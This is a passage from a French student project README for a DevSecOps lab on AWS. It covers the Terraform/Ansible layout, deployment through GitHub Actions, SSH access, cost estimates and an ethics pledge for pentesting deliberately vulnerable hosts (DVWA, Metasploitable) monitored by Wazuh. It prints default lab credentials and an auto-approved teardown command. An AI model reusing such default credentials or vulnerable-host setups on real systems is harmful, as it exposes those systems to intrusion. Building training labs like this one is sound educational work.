|       +-- ansible.yml          # Workflow Ansible standalone (re-run config)
|       +-- security-scan.yml    # Scan IaC isole (PR + push)
|
+-- terraform/
|   +-- main.tf                  # Module root : providers, AMI, modules
|   +-- variables.tf             # Variables globales (region, CIDRs, types d'instance)
|   +-- outputs.tf               # IPs, URLs, commandes SSH exportees
|   +-- backend.tf               # Backend S3 avec verrou natif
|   +-- terraform.tfvars.example # Template de configuration
|   +-- modules/
|       +-- networking/          # VPCs, IGW, NAT GW, Subnets, VPC Peering, SGs
|       +-- compute-client/      # Bastion + DVWA + Metasploitable + EIP + Key Pair
|       +-- compute-soc/         # Wazuh Server + EIP (50 Go gp3)
|
+-- ansible/
|   +-- ansible.cfg              # Configuration Ansible globale
|   +-- site.yml                 # Playbook principal (wazuh-server → dvwa → wazuh-agent)
|   +-- inventory/
|   |   +-- hosts.yml            # Inventaire dynamique (genere par le pipeline CI/CD)
|   +-- roles/
|       +-- wazuh-server/        # Installation Wazuh All-in-One + regles custom + AR
|       |   +-- tasks/main.yml
|       |   +-- files/custom_rules.xml
|       |   +-- handlers/
|       |   +-- templates/
|       +-- wazuh-agent/         # Enregistrement et demarrage des agents Wazuh
|       +-- dvwa/                # Deploiement DVWA via Docker
|       +-- metasploitable/      # Configuration des services vulnerables
|
+-- bootstrap.ps1                # Script PowerShell (S3, SSH key)
+-- .bootstrap_bucket_name       # Nom du bucket S3 de state
+-- docs/                        # Documentation et captures d'ecran
```

---

## 12. Deploiement et utilisation

### Secrets GitHub requis

| Secret | Valeur |
|---|---|
| `AWS_ACCESS_KEY_ID` | Cle d'acces AWS (IAM user `pfs-soc`) |
| `AWS_SECRET_ACCESS_KEY` | Cle secrete AWS |
| `SSH_PUBLIC_KEY` | Contenu de `~/.ssh/pfs-soc-key.pub` |
| `EC2_PRIVATE_KEY` | Contenu de `~/.ssh/pfs-soc-key` (cle privee) |

### Etape 1 — Bootstrap (une seule fois)

```powershell
# Configurer AWS CLI
aws configure --profile pfs-soc

# Lancer le bootstrap (cree S3 + cle SSH)
.\bootstrap.ps1 -Profile pfs-soc -Region us-east-1
```

### Etape 2 — Deploiement complet

```bash
# Deploiement automatique complet via CI/CD
git push origin main

# Ou manuellement via workflow_dispatch :
# GitHub → Actions → "Deploy SOC Infrastructure" → Run workflow → apply
```

### Etape 3 — Acces au Dashboard Wazuh

```
URL      : https://<wazuh_public_ip>
Login    : admin
Password : voir wazuh-passwords-tool.sh sur le serveur
```

### Connexion SSH (debug)

```bash
# Bastion
ssh -i ~/.ssh/pfs-soc-key ubuntu@<bastion_public_ip>

# Wazuh (via Bastion)
ssh -i ~/.ssh/pfs-soc-key -J ubuntu@<bastion_public_ip> ubuntu@<wazuh_private_ip>

# DVWA (via Bastion)
ssh -i ~/.ssh/pfs-soc-key -J ubuntu@<bastion_public_ip> ubuntu@<dvwa_private_ip>

# Tunnel DVWA (acces web local)
ssh -i ~/.ssh/pfs-soc-key -L 8080:<dvwa_private_ip>:80 -N ubuntu@<bastion_public_ip>
# Puis : http://localhost:8080 (admin / password)
```

### Destruction de l'infrastructure

```bash
# Via GitHub Actions (recommande) :
# GitHub → Actions → "Deploy SOC Infrastructure" → Run workflow → destroy

# Ou localement :
terraform destroy -auto-approve \
  -var="ssh_public_key=$(cat ~/.ssh/pfs-soc-key.pub)" \
  -var="my_public_ip=$(curl -s ifconfig.me)/32"
```

---

## 13. Couts AWS estimes

| Ressource | Type | Cout/heure | Cout/3 jours |
|---|---|---|---|
| Wazuh Server | c7i-flex.large | ~$0.063 | ~$4.54 |
| Bastion | t3.micro | ~$0.010 | ~$0.72 |
| DVWA | t3.micro | ~$0.010 | ~$0.72 |
| Metasploitable | t3.micro | ~$0.010 | ~$0.72 |
| NAT Gateway | — | ~$0.045/h + data | ~$1.00 |
| EIPs (x2) | — | ~$0.005/h | ~$0.36 |
| S3 (tfstate) | — | Negligeable | ~$0.10 |
| **Total estime** | | | **~$8 pour 3 jours** |

> Toutes les ressources sont detruites apres les demonstrations via `terraform destroy`.

---

## 14. Engagement ethique

L'ensemble des activites de pentest et d'exploitation decrites dans ce projet sont realisees **exclusivement sur des ressources AWS appartenant au compte projet** cree par les etudiants. Aucune attaque n'a ete menee sur des systemes tiers, des infrastructures d'entreprise ou des services publics.

Les etudiants s'engagent a :
- Ne jamais utiliser les techniques apprises sur des systemes sans autorisation explicite
- Supprimer toutes les ressources AWS creees (`terraform destroy`) en fin de projet
- Ne pas stocker de donnees sensibles reelles dans l'infrastructure du lab
- Respecter les Conditions Generales d'Utilisation d'AWS (politique d'utilisation acceptable)
- Invalider tous les credentials documentes immediatement apres la generation des preuves

Les activites de pentest sur sa propre infrastructure AWS sont autorisees sans demande prealable pour les services utilises (EC2, S3, IAM) selon la politique AWS de test de penetration.

---

## Auteurs

**AMHIRAQ ABDELHAKIM** — Hakim
**BOUANANI NOUSSAIR** — Noussair

Ecole Nationale des Sciences Appliquees de Marrakech (ENSA-M)
Filiere GCDSTE — CI2 | Projet de Fin de Semestre — DevSecOps | 2025–2026
Encadrant : ACHABROU OMAR

---

*Ce projet demontre le cycle DevSecOps complet : deploiement IaC → pentest → hardening → detection SIEM. L'infrastructure est reproductible en un seul `git push`, les vulnerabilites sont detectees avant deploiement via le pipeline shift-left, et les attaques sont detec tees en temps reel par le SIEM custom.*
